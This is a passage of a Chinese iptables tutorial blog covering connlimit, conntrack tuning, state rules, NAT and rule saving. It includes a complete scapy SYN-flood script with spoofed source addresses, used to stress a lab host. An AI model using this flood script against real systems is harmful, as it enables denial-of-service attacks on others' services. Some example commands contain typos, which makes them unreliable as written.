https://k8s.catyer.cn</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br>&lt;style&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="iptables-F：清空某个链-表-的规则"><a href="#iptables-F：清空某个链-表-的规则" class="headerlink" title="iptables -F：清空某个链(表)的规则"></a>iptables -F：清空某个链(表)的规则</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -F：删除掉某个chain的规则<br>iptables -F WEB：清空掉有关自定义链的<br>iptables -X WEB：清空某个空的自定义链<br><br>iptables -F INPUT：清空掉有关INPUT链的规则<br></code></pre></td></tr></table></figure>
+
+<h2 id="iprange扩展：指定IP地址范围"><a href="#iprange扩展：指定IP地址范围" class="headerlink" title="iprange扩展：指定IP地址范围"></a>iprange扩展：指定IP地址范围</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">--src-range：源地址范围<br>--dst-range：目的地址范围<br><br><span class="hljs-comment">##实现129和130同时能够访问本机的80,443端口，nginx默认的访问端口是8001</span><br>iptables -A WEB -p tcp -m multiport --dports 80,443 -m iprange --src-range 10.0.0.129-10.0.0.130 -j ACCEPT<br>iptables -I WEB -p tcp -m multiport --dports 8001 -m iprange --src-range 10.0.0.129-10.0.0.130 -j ACCEPT<br></code></pre></td></tr></table></figure>
+
+<h2 id="connlimit：限制访问服务端的连接并发数"><a href="#connlimit：限制访问服务端的连接并发数" class="headerlink" title="connlimit：限制访问服务端的连接并发数"></a>connlimit：限制访问服务端的连接并发数</h2><p>限制客户端访问服务端的并发连接数，通常用于拒绝DDOS工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">--connlimit-upto N：小于等于N匹配，REJECT/ACCEPT<br>--connlimit-above N：大于N匹配，REJECT/ACCEPT<br><br><span class="hljs-comment">##匹配如果并发连接数大于10的部分，全部拒绝，里面可以加端口号/IP等，-m multiport --dports 80,443</span><br>iptables -A INPUT -p tcp -m --connlimit-above 10 -j REJECT<br></code></pre></td></tr></table></figure>
+
+<h2 id="limit：限流经过的包"><a href="#limit：限流经过的包" class="headerlink" title="limit：限流经过的包"></a>limit：限流经过的包</h2><p>限制在一分钟内的流过的包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -A INPUT -p tcp -m limit --limit 10/minute<br></code></pre></td></tr></table></figure>
+
+<h2 id="泛洪攻击的python脚本：升级python版本至python-3-5-1"><a href="#泛洪攻击的python脚本：升级python版本至python-3-5-1" class="headerlink" title="泛洪攻击的python脚本：升级python版本至python 3.5.1"></a>泛洪攻击的python脚本：升级python版本至python 3.5.1</h2><p>查看本机的python版本：python -V，需要升级python版本，执行python脚本</p>
+<p>需要升级python版本到3以上</p>
+<p>当在Python 2.X文件中写中文注释或输出中文时候，经常会出现编译错误（在Python 3.X中没有这种错误。）这是因为Python 2.X的默认编码文件是用ASCII码—-包括中文的注释</p>
+<p><img src="2792175-20220828181115451-1027421414.png" srcset="/img/loading.gif" lazyload alt="image-20220730115734200"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##安装python依赖包</span><br>yum install openssl-devel bzip2-devel expat-devel gdbm-devel readline-devel sqlite-devel -y<br><br><span class="hljs-comment">##下载python-3.5.1版本的包</span><br>wget https://www.python.org/ftp/python/3.5.1/Python-3.5.1.tgz<br><br><span class="hljs-comment">##删除旧版本的python</span><br><span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">rm</span> -rf /usr/local/python<br><br><span class="hljs-comment">##安装3.5.1版本的python</span><br>tar -xf Python-3.5.1.tgz<br><span class="hljs-built_in">mv</span> Python-3.5.1 /usr/local<br><span class="hljs-comment">##配置</span><br>./configure<br><span class="hljs-comment">##编译安装</span><br>make &amp;&amp; make install<br><br><span class="hljs-built_in">ln</span> -s /usr/local/bin/Python3.5 /usr/local/python<br><span class="hljs-comment">##查看python版本</span><br>python3 -V<br>[14:06:19 root@slave1 ~]<span class="hljs-comment">#python3 -V</span><br>Python 3.5.1<br><br><span class="hljs-comment">##修改/usr/bin/yum的默认python版本，yum文件默认是python语言写的</span><br>vim /usr/bin/yum<br><span class="hljs-comment">#!/usr/bin/python2.7</span><br>import sys<br></code></pre></td></tr></table></figure>
+
+<p>泛洪攻击脚本：DDOS攻击，分布式的拒绝服务，泛洪攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br> <br><span class="hljs-comment">#random IP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randomIP</span>():<br>    ip=<span class="hljs-string">&quot;.&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))))<br>    <span class="hljs-keyword">return</span> ip<br> <br><span class="hljs-comment">#random port</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">randomPort</span>():<br>    port=random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">10000</span>)<br>    <span class="hljs-keyword">return</span> port<br> <br><span class="hljs-comment">#syn-flood</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>(<span class="hljs-params">count,dstIP,dstPort</span>):<br>    total=<span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Packets are sending ...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        <span class="hljs-comment">#IPlayer</span><br>        srcIP=randomIP()<br>        dstIP=dstIP<br>        IPlayer = IP(src=srcIP,dst=dstIP)<br>        <span class="hljs-comment">#TCPlayer</span><br>        srcPort=randomPort()<br>        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>        <span class="hljs-comment">#send pack</span><br>        packet = IPlayer / TCPlayer<br>        send(packet)<br>        total+=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Total packets sent: %i&quot;</span> % total)<br> <br><span class="hljs-comment">#infor</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#&quot;</span>*<span class="hljs-number">30</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# Welcome to SYN Flood Tool  #&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#&quot;</span>*<span class="hljs-number">30</span>)<br>    <span class="hljs-comment">#IP &amp; port </span><br>    dstIP = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target IP : 10.0.0.128&quot;</span>)<br>    dstPort = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target Port : 8001&quot;</span>))<br>    <span class="hljs-keyword">return</span> dstIP, dstPort<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dstIP, dstPort=info()<br>    count=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input the number of packets：&quot;</span>))<br>    synFlood(count,dstIP,dstPort)<br></code></pre></td></tr></table></figure>
+
+<h2 id="state扩展：根据追踪机制去检查连接状态-一般是ESTABLISHED"><a href="#state扩展：根据追踪机制去检查连接状态-一般是ESTABLISHED" class="headerlink" title="state扩展：根据追踪机制去检查连接状态(一般是ESTABLISHED)"></a>state扩展：根据追踪机制去检查连接状态(一般是ESTABLISHED)</h2><p>面试题<br>这两条路径，都是Linux系统内可建立的最大连接数，上限并发，可以自己去设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##系统内已经建立的连接(state为established)</span><br>[root@master ~]<span class="hljs-comment">#cat /proc/net/nf_conntrack</span><br>ipv4     2 tcp      6 431954 ESTABLISHED src=172.16.58.35 dst=172.16.48.104 sport=46638 dport=443 src=172.17.0.2 dst=172.16.58.35 sport=443 dport=46638 [ASSURED] mark=0 zone=0 use=2<br>ipv4     2 tcp      6 13 CLOSE_WAIT src=172.16.48.131 dst=172.16.48.104 sport=38264 dport=443 src=172.17.0.2 dst=172.16.48.131 sport=443 dport=38264 [ASSURED] mark=0 zone=0 use=2<br><br><span class="hljs-comment">##这一条是本地连接的</span><br>ipv4     2 tcp      6 93 TIME_WAIT src=127.0.0.1 dst=127.0.0.1 sport=47186 dport=10051 src=127.0.0.1 dst=127.0.0.1 sport=10051 dport=47186 [ASSURED] mark=0 zone=0 use=2<br><br><span class="hljs-comment">##查看最大连接数</span><br>[root@master ~]<span class="hljs-comment">#cat /proc/sys/net/netfilter/nf_conntrack_max </span><br>65536<br>[root@master ~]<span class="hljs-comment">#cat /proc/sys/net/nf_conntrack_max </span><br>65536<br><br><span class="hljs-comment">##放通源端为10.0.0.129的icmp规则</span><br>Chain WEB (1 references)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     icmp --  10.0.0.129           0.0.0.0/0   <br></code></pre></td></tr></table></figure>
+
+<h3 id="系统最大连接数-proc-sys-net-netfilter-nf-conntrack-max"><a href="#系统最大连接数-proc-sys-net-netfilter-nf-conntrack-max" class="headerlink" title="系统最大连接数/proc/sys/net/netfilter/nf_conntrack_max"></a>系统最大连接数/proc/sys/net/netfilter/nf_conntrack_max</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改最大连接数上限，ping请求无法过去</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/netfilter/nf_conntrack_max <br><span class="hljs-built_in">echo</span> 65536 &gt; /proc/sys/net/netfilter/nf_conntrack_max <br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181115773-566092871.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看系统日志(是linux系统日志)，证明是这个track表已经达到上限，直接丢包了(造成网站无法访问，访问的tcp连接直接中断)，需要恢复回去；类似的操作还有redis的最大连接上线并发，可以调整这个值</p>
+<p>tail -f /var/log/messages</p>
+<p><img src="2792175-20220828181116060-1442443540.png" srcset="/img/loading.gif" lazyload alt="image-20220730143154880"></p>
+<h3 id="nginx-配置系统最大连接并发net-nf-conntrack-max-系统调优-—-gt-面试题，配置内核配置文件sysctl-conf"><a href="#nginx-配置系统最大连接并发net-nf-conntrack-max-系统调优-—-gt-面试题，配置内核配置文件sysctl-conf" class="headerlink" title="nginx-配置系统最大连接并发net.nf_conntrack_max(系统调优)—&gt;面试题，配置内核配置文件sysctl.conf"></a>nginx-配置系统最大连接并发net.nf_conntrack_max(系统调优)—&gt;面试题，配置内核配置文件sysctl.conf</h3><p>需要修改系统内核参数配置文件：**/etc/sysctl.conf**</p>
+<p>在生产系统中，通常有一些前端的机器需要用于转发外部的客户端请求，例如nginx等负载均衡服务器，需要配置一下net.nf_conntrack_max这个参数，免得并发一大系统就崩溃了，导致服务器无法执行转发服务</p>
+<p>一键入职机器的net.nf_conntrack_max 参数，配置到了262144，因为是前端的nginx转发机器，转发到各个server中，转发到各个服务器组中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看一键入职最大连接数nf_conntrack_max</span><br>sysctl -a |grep net.nf_conntrack_max<br>net.nf_conntrack_max = 262144<br><br><span class="hljs-comment">##配置net.nf_conntrack_max参数，调整linux的内核参数</span><br>vim /etc/sysctl.conf<br>net.nf_conntrack_max=100000<br>sysctl -p <span class="hljs-comment">##生效</span><br><br><span class="hljs-comment">##默认的系统配置内是有生效的</span><br>sysctl -a |grep net.nf_conntrack<br>net.nf_conntrack_max = 100000<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181116392-132789822.png" srcset="/img/loading.gif" lazyload alt="image-20220730144147814"></p>
+<h2 id="连接跟踪模块-系统参数-的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动"><a href="#连接跟踪模块-系统参数-的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动" class="headerlink" title="连接跟踪模块(系统参数)的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动"></a>连接跟踪模块(系统参数)的开启，是有加载这个内核模块的，加载这个模块，最大连接数参数才能启动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">lsmod | grep nf_conntrack<br>sysctl -a | grep nf_conntrack_max<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181116707-944456070.png" srcset="/img/loading.gif" lazyload alt="image-20220730161940656"></p>
+<p>解决方案：</p>
+<p>1.调大nf_conntrack_max的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##配置net.nf_conntrack_max参数，调整linux的内核参数</span><br>vim /etc/sysctl.conf<br>net.nf_conntrack_max=100000<br>sysctl -p <span class="hljs-comment">##生效</span><br></code></pre></td></tr></table></figure>
+
+<p>2.可设置tcp连接timeout超时时间，减少超时时间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查询</span><br>sysctl -a | grep netfilter.nf_conntrack_tcp<br><br>net.netfilter.nf_conntrack_tcp_timeout_established = 432000<br>net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120<br>net.netfilter.nf_conntrack_tcp_timeout_last_ack = 30<br>net.netfilter.nf_conntrack_tcp_timeout_max_retrans = 300<br></code></pre></td></tr></table></figure>
+
+<h3 id="state模块应用"><a href="#state模块应用" class="headerlink" title="state模块应用"></a>state模块应用</h3><p>-m state分为：NEW，ESTABLISHED，RELATED，INVALID等state状态，最重点就是NEW和ESTABLISHED，<strong>新连接(新机器请求)和已经建立的连接(老机器SSH连接等，telnet连接等)</strong></p>
+<p>1.128能访问129,129不能访问128</p>
+<p>原理：拒绝所有来自10.0.0.129的新连接(新的tcp包)，128的出方向(output)没有限制，所以就是128能通129</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -s 10.0.0.129 -m state --state NEW -j REJECT<br></code></pre></td></tr></table></figure>
+
+<p>2.允许已经建立连接的老机器访问state established</p>
+<p>原理：已与本机建立连接的客户端，比如SSH连接，还可以连，其他的拒绝访问，可以插在默认的拒绝所有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -m state --state ESTABLISHED -j ACCEPT<br></code></pre></td></tr></table></figure>
+
+<h1 id="TARGET：-j动作"><a href="#TARGET：-j动作" class="headerlink" title="TARGET：-j动作"></a>TARGET：-j动作</h1><p>TARGET主要模块有：ACCEPT，REJECT，DROP(丢包)，LOG(记录到日志中)</p>
+<h1 id="iptables规则优化最佳实践"><a href="#iptables规则优化最佳实践" class="headerlink" title="iptables规则优化最佳实践"></a>iptables规则优化最佳实践</h1><p>主要是看主机在通过iptables所需要经过的过滤规则，如何配置性能更优</p>
+<p>1.ESTABLISHED的连接，比如可以查看cat /proc/net/nf_conntrack查看已经建立连接的客户端，可以放在前面</p>
+<p>2.入站新请求，-m state –state NEW，可以将其REJECT，谨慎放行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -A INPUT -m state --state NEW -s 10.20.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure>
+
+<p>3.默认所有都是拒绝，在拒绝的大段前面放行该放行的小段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##默认所有全部拒绝，写在最下面</span><br>iptables -A INPUT -j REJECT<br><br><span class="hljs-comment">##类似</span><br>iptables -I INPUT -p tcp -m multiport --dports 80,443,8080 -s 172.16.0.0/24 -d 10.0.0.0/24 -j ACCREPT<br></code></pre></td></tr></table></figure>
+
+<p>4.访问同一类应用，比如http 80端口，拒绝10.0.0.0/24，允许10.0.0.129访问，129放大段前面，大段包含小段，优先找小段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -I INPUT -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT<br>iptables -A INPUT -p tcp --dport 80 -s 10.0.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure>
+
+<p>5.不同类应用，mysql&amp;http，匹配大的放前面</p>
+<p>6.匹配多个端口，多个地址，放一起</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">-p tcp -m multiport --dports 80,443,8001<br>-p tcp -m iprange --src-range 10.0.0.128-10.0.0.135<br></code></pre></td></tr></table></figure>
+
+<p>7.配置类似公有云安全组的方式，默认拒绝所有，需要放行才加白</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">-s 10.0.0.0/24 -j REJECT<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181117072-1546640363.png" srcset="/img/loading.gif" lazyload alt="image-20220731084029330"></p>
+<h1 id="iptables规则的保存"><a href="#iptables规则的保存" class="headerlink" title="iptables规则的保存"></a>iptables规则的保存</h1><p>对于Cent OS 7及以上，将规则重定向到指定文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables-save &gt; /iptables/rules<br></code></pre></td></tr></table></figure>
+
+<p>如果误删除，可以使用，这个是标准输入交互，将文件内容输入进去即可，这个保存文件可以拷贝给其他主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables-restore &lt; /iptables/rules<br>scp rules $host:/iptables/rules<br></code></pre></td></tr></table></figure>
+
+<p>可以将这个写进开机自启动的脚本内，但是需要确保这个iptables/rules文件要在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">vim /etc/rc.local<br>##注意：rc.local必须chmod +x rc.local<br><br>##手动加载iptables规则<br>iptables-restore &lt; /iptables/rules<br></code></pre></td></tr></table></figure>
+
+<p>安装service的方法</p>
+<p>可以安装iptables.service的包，默认的iptables规则路径在/etc/sysconfig/iptables.service</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install iptables.service<br>systemctl status iptables<br>systemctl status iptables.service<br>● iptables.service - IPv4 firewall with iptables<br>   Loaded: loaded (/usr/lib/systemd/system/iptables.service; enabled; vendor preset: disabled)<br>   Active: active (exited) since Sun 2022-07-31 08:35:18 CST; 47min ago<br> Main PID: 8674 (code=exited, status=0/SUCCESS)<br>   CGroup: /system.slice/iptables.service<br></code></pre></td></tr></table></figure>
+
+<p>可以使用iptables-save将规则保存在文件中</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">Iptables-save &gt; /iptables/rules<br>开机自启动<br>systemctl enable --now iptables.service<br></code></pre></td></tr></table></figure>
+
+<h1 id="iptables网络FORWARD配置"><a href="#iptables网络FORWARD配置" class="headerlink" title="iptables网络FORWARD配置"></a>iptables网络FORWARD配置</h1><p>实现：内访问外部主机，外部主机不能访问到内部</p>
+<p><img src="2792175-20220828181117452-699103923.png" srcset="/img/loading.gif" lazyload alt="image-20220731121904111"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##环境，不同网段，外网配置为仅主机模式</span><br>外网机器 172.16.0.128 Ubuntu<br>iptables机器 10.0.0.128(内网) 172.16.0.128/24(外网)<br>内网机器 10.0.0.129<br><br><span class="hljs-comment">##slave1安装http服务</span><br>systemctl <span class="hljs-built_in">enable</span> --now httpd<br><br><span class="hljs-comment">##ubuntu修改root密码，ubuntu主机默认是使用ubuntu用户登录，但是ubuntu默认是sudoers的权限</span><br>sudo passwd root<br>new password：123<br>su root<br></code></pre></td></tr></table></figure>
+
+<p>目前测试：从内部10.0.0.129能联通172.16.0.128/24，外部进不来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##10.0.0.129 slave1配置：网卡网关指向iptables防火墙机器</span><br>vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>GATEWAY=10.0.0.128<br>ping www.baidu.com是ok的，开启了ipv4转发forward<br><br><span class="hljs-built_in">cat</span> /etc/sysctl.conf | grep ipv4<br>net.ipv4.ip_forward=1<br></code></pre></td></tr></table></figure>
+
+<p>实现转发FORWARD配置，实现内部curl外部机器，仅有外部机器这个IP能够访问内部</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##先拒绝所有，再放行</span><br>iptables -A FORWARD -j REJECT<br><br><span class="hljs-comment">##内部到外网新的包全部放通</span><br>iptables -I FORWARD -s 10.0.0.0/24 ！-d 10.0.0.0/24 -m state --state NEW -j ACCEPT<br><br><span class="hljs-comment">##仅允许转发到外部机器</span><br>iptables -I FORWARD -s 10.0.0.0/24 ！-d  -m state --state NEW -j ACCEPT<br><br><span class="hljs-comment">##所有网段FORWARD转发的包全部接收，状态为ESTABLISHED</span><br>iptables -I FORWARD -m state --state ESTABLISHED -j ACCEPT<br></code></pre></td></tr></table></figure>
+
+<h1 id="iptables实现SNAT和DNAT"><a href="#iptables实现SNAT和DNAT" class="headerlink" title="iptables实现SNAT和DNAT"></a>iptables实现SNAT和DNAT</h1><p>SNAT：源地址转换，内网能够访问公网，哪边出</p>
+<p>DNAT：目的地址转换，目的能够访问内网，NAT网关起到一个转发的作用，转发到目的IP的目的端口</p>
+<p>一般在企业内部，SNAT用于内部机器上网，比如k8s集群内的node节点；外部访问一般使用SLB负载均衡或者是直接机器的公网IP解析到域名，通过SLB/机器的安全组规则进行流量的过滤</p>
+<p>同一台机器的SNAT规则：根据业务端口的不同划分</p>
+<p>不同机器相同业务的SNAT规则：根据IP地址的不同划分</p>
+<p>SNAT：必须要配置内网地址，私网三类地址</p>
+<p><img src="2792175-20220828181117815-1787667441.png" srcset="/img/loading.gif" lazyload alt="image-20220731174427030"></p>
+<p>NAT表的四个链：PRE-ROUTING，INPUT，OUTPUT，POST-ROUTING，需要在POST-ROUTING chain上面配置，向外的地址转换NAT</p>
+<p><img src="2792175-20220828181118152-528216290.png" srcset="/img/loading.gif" lazyload alt="image-20220731174652547"></p>
+<p>从POST-ROUTING转发出去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##专线网络,to-source表示当前固定的公网IP</span><br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j SNAT --to-source 100.9.6.4<br><br><span class="hljs-comment">##动态IP，查看NAT表的信息，除了10.0.0.0/24网段，其他全部转发，从POST_ROUTING出去</span><br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j MASQUERADE<br>iptables -t nat -nL / iptables -t nat -nL --line-numbers<br>Chain POSTROUTING (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>MASQUERADE  all  --  10.0.0.0/24         !10.0.0.0/24 <br><br><span class="hljs-comment">##删除NAT表的规则</span><br>iptables -t nat -D POSTROUTING(chain) 1<br><br><span class="hljs-comment">##配置iptables机器的双网卡，要和ubuntu主机同一个网段</span><br><span class="hljs-built_in">cp</span> ifcfg-ens33 ifcfg-ens36<br>IPADDR=172.16.0.10<br>NETMASK=255.255.255.0<br>GATEWAY=172.16.0.2<br><br><span class="hljs-comment">##在ubuntu上tail日志查看访问IP，获取到源端IP了；去掉POSTROUTING规则就无法curl通了，slave1的gateway是10.0.0.128，出口网关，所以在nginx日志中获取的是出口网关的IP</span><br>curl 